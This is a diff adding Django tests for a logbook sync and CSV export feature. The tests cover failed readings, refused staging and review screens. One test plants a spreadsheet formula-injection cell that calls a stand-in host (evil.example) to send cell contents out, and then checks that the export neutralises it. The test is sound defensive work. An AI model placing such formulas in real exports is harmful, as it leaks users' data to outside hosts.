@@ -104,3 +104,78 @@ class LogbookSyncTests(PrivateApiTestCase):
         outsider = Client()
         outsider.force_login(self.outsider)
         self.assertEqual(self.get("logbook/export/", client=outsider).status_code, 403)
+
+
+class LogbookSafetyTests(PrivateApiTestCase):
+    """What the independent review of 24 October 2026 asked to hold."""
+
+    def setUp(self):
+        super().setUp()
+        self.stage(ops_csv(ops_row(date="06/02/2024")))
+
+    def test_a_bad_reading_never_replaces_the_rows_already_read(self):
+        good = sync_logbook(actor=self.reviewer, get=fake_site)
+        broken_site = {**SITE, f"{ORG}/operation-sitemap.xml": None}
+        bad = sync_logbook(actor=self.reviewer, get=broken_site.get)
+        self.assertEqual(bad.status, "failed")
+        self.assertEqual(self.get("logbook/").json()["rows"], 2)
+        # A rotation page that disappears fails the reading too, rather than shrinking it.
+        missing_page = {**SITE, ROTATION: None}
+        self.assertEqual(sync_logbook(actor=self.reviewer, get=missing_page.get).status, "failed")
+        again = sync_logbook(actor=self.reviewer, get=fake_site)
+        self.assertEqual((again.status, again.snapshot_id), ("unchanged", good.snapshot_id))
+        self.assertEqual(
+            self.get(f"preview/events/?source={LOGBOOK_SOURCE_KEY}").json()["total_count"], 2
+        )
+
+    def test_the_export_cannot_carry_a_formula(self):
+        hostile = {
+            **SITE,
+            f"{ORG}/operation-archived/": SITE[f"{ORG}/operation-archived/"].replace(
+                "Port fictif", '=IMPORTDATA("https://evil.example/?"&A1)'
+            ),
+        }
+        run = sync_logbook(actor=self.reviewer, get=hostile.get)
+        row = run.snapshot.rows.get(line=2)
+        # The port is refused at reading; a formula-like cell is also neutralised at export.
+        self.assertIsNone(row.candidate["Port_disembarkation"])
+        row.raw_cells[1] = "=1+1"
+        row.save()
+        approve_link(row=row, actor=self.reviewer, reason="Checked")
+        lines = self.get("logbook/export/").content.decode().splitlines()
+        self.assertIn(",'=1+1,", lines[1])
+        self.assertNotIn("IMPORTDATA", "\n".join(lines))
+
+    def test_a_refused_staging_is_recorded_and_changes_nothing(self):
+        from unittest import mock
+
+        from django.core.exceptions import ValidationError
+
+        sync_logbook(actor=self.reviewer, get=fake_site)
+        with mock.patch(
+            "catalog.logbook_sync.stage_snapshot", side_effect=ValidationError("refused")
+        ):
+            run = sync_logbook(actor=self.reviewer, get=fake_site)
+        self.assertEqual((run.status, run.message), ("refused", "refused"))
+        self.assertEqual(self.get("logbook/").json()["rows"], 2)
+
+
+class LogbookPresentationTests(PrivateApiTestCase):
+    def setUp(self):
+        super().setUp()
+        self.stage(ops_csv(ops_row(date="06/02/2024")))
+
+    def test_the_verify_screen_carries_the_sentence_and_the_card_the_yearly_check(self):
+        run = sync_logbook(actor=self.reviewer, get=fake_site)
+        row = run.snapshot.rows.get(line=2)
+        detail = self.get(f"review/rows/{row.pk}/").json()
+        self.assertIn("completes the recovery of 40", detail["evidence"]["quote"])
+        self.assertEqual(detail["evidence"]["rotation"], "2025-03-12/2025-03-19")
+        overview = self.get("logbook/").json()
+        self.assertEqual(overview["snapshot"], str(run.snapshot.pk))
+        self.assertEqual(
+            overview["years"],
+            [{"year": 2025, "in_sheet": 0, "from_logbook": 65, "reported": 1358}],
+        )
+        sync = self.get("sync/").json()["sheets"]
+        self.assertIn(LOGBOOK_SOURCE_KEY, {sheet["source_key"] for sheet in sync})
